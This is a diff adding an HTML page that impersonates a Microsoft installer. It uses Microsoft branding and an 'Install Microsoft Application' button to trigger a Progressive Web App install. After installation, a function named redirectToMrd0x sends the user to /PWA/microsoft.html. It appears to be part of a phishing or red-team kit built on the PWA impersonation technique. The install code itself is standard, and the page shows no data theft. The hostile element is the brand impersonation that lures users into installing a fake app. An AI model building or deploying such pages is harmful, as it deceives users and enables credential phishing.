@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Microsoft Install</title>
+  <link rel="manifest" href="manifest.json">
+  <meta name="theme-color" content="#000000">
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 50px;
+      margin: 0;
+      font-family: Arial, sans-serif;
+    }
+    .circle {
+      width: 150px;
+      height: 150px;
+      border-radius: 50%;
+      border: 2px solid black;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+    .circle img {
+      width: 100%;
+      height: auto;
+    }
+    .title {
+      font-size: 24px;
+      color: black;
+      font-weight: bold;
+    }
+    #installButton {
+      margin-top: 20px;
+      display: none;
+      background-color: #333;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 4px;
+    }
+    #installButton img {
+      width: 20px;
+      height: 20px;
+      margin-right: 10px;
+    }
+  </style>
+</head>
+<body>
+  <button id="installButton">
+    <img src="microsoft-logo.svg" alt="Microsoft Logo">
+    Install Microsoft Application
+  </button>
+  <script>
+    if ('serviceWorker' in navigator) {
+      window.addEventListener('load', () => {
+        navigator.serviceWorker.register('/service-worker.js')
+          .then(registration => {
+            console.log('ServiceWorker registration successful with scope: ', registration.scope);
+          }, err => {
+            console.log('ServiceWorker registration failed: ', err);
+          });
+      });
+    }
+    let deferredPrompt;
+    const installButton = document.getElementById('installButton');
+    window.addEventListener('beforeinstallprompt', (e) => {
+      e.preventDefault();
+      deferredPrompt = e;
+      installButton.style.display = 'flex';
+      installButton.addEventListener('click', () => {
+        installButton.style.display = 'none';
+        deferredPrompt.prompt();
+        deferredPrompt.userChoice.then((choiceResult) => {
+          if (choiceResult.outcome === 'accepted') {
+            console.log('User accepted the install prompt');
+          } else {
+            console.log('User dismissed the install prompt');
+          }
+          deferredPrompt = null;
+        });
+      });
+    });
+    window.addEventListener('appinstalled', (evt) => {
+      console.log('PWA was installed');
+      redirectToMrd0x();
+    });
+    function redirectToMrd0x() {
+      if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.getRegistration().then((registration) => {
+          if (registration) {
+            registration.update().then(() => {
+              window.location.href = '/PWA/microsoft.html';
+            });
+          }
+        });
+      } else {
+        window.location.href = '/PWA/microsoft.html';
+      }
+    }
+  </script>
+</body>
+</html>
